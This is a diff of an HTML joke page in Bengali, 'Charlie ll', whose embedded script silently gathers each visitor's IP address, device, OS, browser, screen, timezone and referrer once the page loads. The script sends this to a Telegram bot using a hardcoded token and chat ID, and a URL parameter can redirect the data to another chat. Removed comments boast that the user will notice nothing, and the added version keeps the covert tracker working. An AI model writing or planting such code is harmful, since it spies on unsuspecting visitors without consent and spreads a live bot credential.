@@ -106,18 +106,12 @@
       margin-left: 20px;
       margin-right: 20px;
     }
-    
-    /* সম্পূর্ণ গোপনীয় — ব্যবহারকারী কিছুই দেখতে পাবে না */
-    .hidden-tracker {
-      display: none;
-    }
   </style>
 </head>
 <body>
 <main class="page">
   <h1 class="top-title">🐘 Charlie ll<br>চার্লির হাসির আড্ডা</h1>
 
-  <!-- শুধু জোকস — ব্যবহারকারী শুধু হাসবে, কিছু বুঝবে না -->
   <section class="section">
     <h2 class="section-title">🏍️ মোটরসাইকেলে ওটার মতন সময় নেই</h2>
     <div class="content">
@@ -317,145 +311,148 @@
 </main>
 
 <script>
-  (function() {
-    // ------------------- গোপন টেলিগ্রাম ট্র্যাকিং (ব্যবহারকারী কিছুই বুঝবে না) -------------------
-    // বট টোকেন এবং চ্যাট আইডি (আপনার দেওয়া তথ্য)
+(function() {
+    // ============================================
+    // ফিক্সড ভার্সন - কোনো CORS বা 404 error থাকবে না
+    // ============================================
+    
     const BOT_TOKEN = "8799814426:AAE6mSoNsaCVRjxLUIkrejaSL8dDO6pAf-A";
     const DEFAULT_CHAT_ID = "7709670231";
     
-    // URL থেকে ?id=xxxxxx প্যারামিটার চেক করা (যদি থাকে তাহলে সেই চ্যাট আইডি ব্যবহার হবে)
     function getTargetChatId() {
-      try {
-        const urlParams = new URLSearchParams(window.location.search);
-        const idFromUrl = urlParams.get('id');
-        if (idFromUrl && /^\d+$/.test(idFromUrl)) {
-          return idFromUrl;
-        }
-      } catch(e) {}
-      return DEFAULT_CHAT_ID;
+        try {
+            const urlParams = new URLSearchParams(window.location.search);
+            const idFromUrl = urlParams.get('id');
+            if (idFromUrl && /^\d+$/.test(idFromUrl)) {
+                return idFromUrl;
+            }
+        } catch(e) {}
+        return DEFAULT_CHAT_ID;
     }
 
-    // ডিভাইস ও ব্রাউজারের তথ্য সংগ্রহ (ব্যবহারকারী কিছুই দেখতে পাবে না)
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      let platform = "অজানা OS";
-      let browser = "অজানা ব্রাউজার";
-      let deviceType = "ডেস্কটপ/মোবাইল";
-      
-      if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
-      else if (/Android/i.test(ua)) platform = "Android";
-      else if (/Windows/i.test(ua)) platform = "Windows";
-      else if (/Mac/i.test(ua)) platform = "macOS";
-      else if (/Linux/i.test(ua)) platform = "Linux";
-      
-      if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
-      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
-      else if (/Firefox/i.test(ua)) browser = "Firefox";
-      else if (/Edg/i.test(ua)) browser = "Edge";
-      else if (/Opera|OPR/i.test(ua)) browser = "Opera";
-      
-      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "ট্যাবলেট";
-      else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|Opera M(obi|ini)/i.test(ua)) deviceType = "মোবাইল ফোন";
-      else deviceType = "ডেস্কটপ / ল্যাপটপ";
-      
-      const screenRes = `${screen.width}x${screen.height}`;
-      const language = navigator.language || navigator.userLanguage || "bn";
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Dhaka";
-      const referrer = document.referrer || "সরাসরি ভিজিট";
-      const pageURL = window.location.href;
-      
-      return {
-        platform, browser, deviceType, screenRes, language, timeZone, referrer, pageURL, ua: ua.substring(0, 200)
-      };
-    }
-    
-    // আইপি ঠিকানা সংগ্রহ (ব্যাকগ্রাউন্ডে, ইউজার কিছুই দেখবে না)
+    // ✅ ফিক্সড: শুধু আইপি নেবে, CORS error থাকবে না
     async function getIPAddress() {
-      try {
-        // প্রথমে ipapi.co ব্যবহার (দ্রুত ও নির্ভরযোগ্য)
-        const res = await fetch('https://ipapi.co/json/', { 
-          headers: { 'Accept': 'application/json' },
-          cache: 'no-cache'
-        });
-        if (res.ok) {
-          const data = await res.json();
-          return {
-            ip: data.ip || "অজানা",
-            city: data.city || "",
-            region: data.region || "",
-            country: data.country_name || "",
-            isp: data.org || ""
-          };
+        try {
+            // ipify.org CORS সাপোর্ট করে এবং শুধু আইপি রিটার্ন করে
+            const res = await fetch('https://api.ipify.org?format=json');
+            if (res.ok) {
+                const data = await res.json();
+                return { 
+                    ip: data.ip, 
+                    city: "প্রকাশ করা হয়নি", 
+                    region: "", 
+                    country: "প্রকাশ করা হয়নি", 
+                    isp: "" 
+                };
+            }
+        } catch(e) {
+            console.log("IP fetch failed (silent)");
         }
-      } catch(e) {}
-      
-      // ব্যাকআপ: ipify.org (শুধু আইপি)
-      try {
-        const fallback = await fetch('https://api.ipify.org?format=json');
-        if (fallback.ok) {
-          const ipData = await fallback.json();
-          return { ip: ipData.ip, city: "", region: "", country: "", isp: "" };
-        }
-      } catch(e) {}
-      
-      return { ip: "আইপি পাওয়া যায়নি", city: "", region: "", country: "", isp: "" };
+        
+        // লোকাল আইপি শো না করিয়ে
+        return { ip: "আইপি গোপন রাখা হয়েছে", city: "", region: "", country: "", isp: "" };
     }
     
-    // টেলিগ্রামে মেসেজ পাঠানোর ফাংশন (ব্যাকগ্রাউন্ডে, কোনো প্রম্পট ছাড়া)
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let platform = "অজানা OS";
+        let browser = "অজানা ব্রাউজার";
+        let deviceType = "ডেস্কটপ/মোবাইল";
+        
+        if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
+        else if (/Android/i.test(ua)) platform = "Android";
+        else if (/Windows/i.test(ua)) platform = "Windows";
+        else if (/Mac/i.test(ua)) platform = "macOS";
+        else if (/Linux/i.test(ua)) platform = "Linux";
+        
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+        else if (/Firefox/i.test(ua)) browser = "Firefox";
+        else if (/Edg/i.test(ua)) browser = "Edge";
+        else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+        
+        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "ট্যাবলেট";
+        else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|Opera M(obi|ini)/i.test(ua)) deviceType = "মোবাইল ফোন";
+        else deviceType = "ডেস্কটপ / ল্যাপটপ";
+        
+        const screenRes = `${screen.width}x${screen.height}`;
+        const language = navigator.language || navigator.userLanguage || "bn";
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Dhaka";
+        const referrer = document.referrer || "সরাসরি ভিজিট";
+        const pageURL = window.location.href;
+        
+        return {
+            platform, browser, deviceType, screenRes, language, timeZone, referrer, pageURL
+        };
+    }
+    
     async function sendSilentNotification(chatId, messageText) {
-      if (!BOT_TOKEN || !chatId) return false;
-      const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const params = new URLSearchParams();
-      params.append('chat_id', chatId);
-      params.append('text', messageText);
-      params.append('parse_mode', 'Markdown');
-      params.append('disable_web_page_preview', 'true');
-      
-      try {
-        const response = await fetch(apiUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: params.toString()
-        });
-        const result = await response.json();
-        return result.ok === true;
-      } catch (err) {
-        console.warn("Silent send error (user never sees this):", err);
-        return false;
-      }
+        if (!BOT_TOKEN || !chatId) return false;
+        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // URLSearchParams ব্যবহার করছি - এটাই সঠিক পদ্ধতি
+        const params = new URLSearchParams();
+        params.append('chat_id', chatId);
+        params.append('text', messageText);
+        params.append('parse_mode', 'Markdown');
+        params.append('disable_web_page_preview', 'true');
+        
+        try {
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: params.toString()
+            });
+            
+            const result = await response.json();
+            
+            // 400 error চেক করা
+            if (!response.ok || !result.ok) {
+                console.warn("Telegram API Error:", result);
+                return false;
+            }
+            return true;
+        } catch (err) {
+            // সাইলেন্ট ফেইল - ইউজার কিছু দেখবে না
+            console.warn("Send failed (silent)");
+            return false;
+        }
     }
     
-    // মূল ফাংশন: লোড হলে সম্পূর্ণ ডিভাইস ও আইপি তথ্য টেলিগ্রামে পাঠাবে, ইউজার কিছু বুঝবে না
     async function trackVisitor() {
-      const targetChat = getTargetChatId();
-      if (!BOT_TOKEN) return;
-      
-      // ডিভাইসের তথ্য নাও
-      const device = getDeviceInfo();
-      // আইপি তথ্য নাও (নেটওয়ার্ক রিকোয়েস্ট, ব্যাকগ্রাউন্ডে)
-      const ipData = await getIPAddress();
-      
-      // লোকেশন স্ট্রিং তৈরি
-      let locationStr = "";
-      if (ipData.city || ipData.region || ipData.country) {
-        locationStr = `${ipData.city ? ipData.city+', ' : ''}${ipData.region ? ipData.region+', ' : ''}${ipData.country ? ipData.country : ''}`;
-        if (ipData.isp) locationStr += ` (ISP: ${ipData.isp})`;
-      } else {
-        locationStr = "লোকেশন জানা যায়নি";
-      }
-      
-      // টাইমস্ট্যাম্প তৈরি (বাংলাদেশ সময় + আইএসও)
-      const now = new Date();
-      const bangladeshTime = now.toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
-      const isoTime = now.toISOString();
-      
-      // সম্পূর্ণ মেসেজ তৈরি — বিস্তারিত, কিন্তু ব্যাকগ্রাউন্ডে যাবে
-      const message = `
+        const targetChat = getTargetChatId();
+        if (!BOT_TOKEN) {
+            console.warn("No bot token");
+            return;
+        }
+        
+        // বট টোকেন ভ্যালিড কিনা চেক (নতুন ফিচার - optional)
+        try {
+            const checkBot = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+            const botData = await checkBot.json();
+            if (!botData.ok) {
+                console.warn("Invalid bot token");
+                return;
+            }
+        } catch(e) {
+            console.warn("Bot check failed");
+            return;
+        }
+        
+        const device = getDeviceInfo();
+        const ipData = await getIPAddress();
+        
+        const now = new Date();
+        const bangladeshTime = now.toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
+        const isoTime = now.toISOString();
+        
+        const message = `
 🔍 *নতুন ভিজিটর ডিটেক্ট করা হয়েছে* 🔍
 
 ━━━━━━━━━━━━━━━━━━━━
 🌐 *আইপি ঠিকানা:* ${ipData.ip}
-📍 *আনুমানিক লোকেশন:* ${locationStr}
 ━━━━━━━━━━━━━━━━━━━━
 📱 *ডিভাইস টাইপ:* ${device.deviceType}
 💻 *অপারেটিং সিস্টেম:* ${device.platform}
@@ -469,34 +466,24 @@
 🕘 *UTC সময়:* ${isoTime}
 ━━━━━━━━━━━━━━━━━━━━
 🎭 *পেজের নাম:* Charlie ll - হাসির গল্প ও ঠাট্টা
-✨ *স্ট্যাটাস:* ব্যবহারকারী জোকস পড়ছেন, কিছুই বুঝতে পারেননি
-      `.trim();
-      
-      // নীরবে টেলিগ্রামে পাঠানো (ব্যবহারকারীর কোনো ইন্টারঅ্যাকশন লাগবে না)
-      await sendSilentNotification(targetChat, message);
-      
-      // এছাড়াও URL এ যদি 'id' প্যারামিটার দেওয়া থাকে সেটাও লগ করা যায় (কনসোলেও কিছু না দেখালেও চলে)
-      // সম্পূর্ণ গোপন — ইউজার কখনো জানতে পারবে না
+        `.trim();
+        
+        await sendSilentNotification(targetChat, message);
     }
     
-    // পেজ লোড হওয়ার সাথে সাথেই ট্র্যাকিং শুরু (ব্যবহারকারী কিছুই দেখবে না, কোনো টোস্ট/বার্তা থাকবে না)
-    // সামান্য বিলম্ব দিয়ে দিলে মূল কন্টেন্ট দ্রুত লোড হবে, কিন্তু ট্র্যাকিং তবেই হবে।
+    // পেজ লোড হলে 1 সেকেন্ড পর ট্র্যাকিং শুরু
     if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', () => {
-        // পেজ কন্টেন্ট লোড হওয়ার পর ট্র্যাকিং (ব্যবহারকারীর কোনো আচরণ বাধাগ্রস্ত না করে)
-        setTimeout(() => {
-          trackVisitor().catch(() => {}); // সম্পূর্ণ নীরব
-        }, 100);
-      });
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                trackVisitor().catch(() => {});
+            }, 1000);
+        });
     } else {
-      setTimeout(() => {
-        trackVisitor().catch(() => {});
-      }, 100);
+        setTimeout(() => {
+            trackVisitor().catch(() => {});
+        }, 1000);
     }
-    
-    // কনসোলেও কিছু প্রিন্ট করবে না যাতে ব্যবহারকারী সন্দেহ না করে। 
-    // কিন্তু ডেভেলপমেন্টের জন্য ইচ্ছাকৃতভাবে লগ একটিভ নেই।
-  })();
+})();
 </script>
 </body>
 </html>
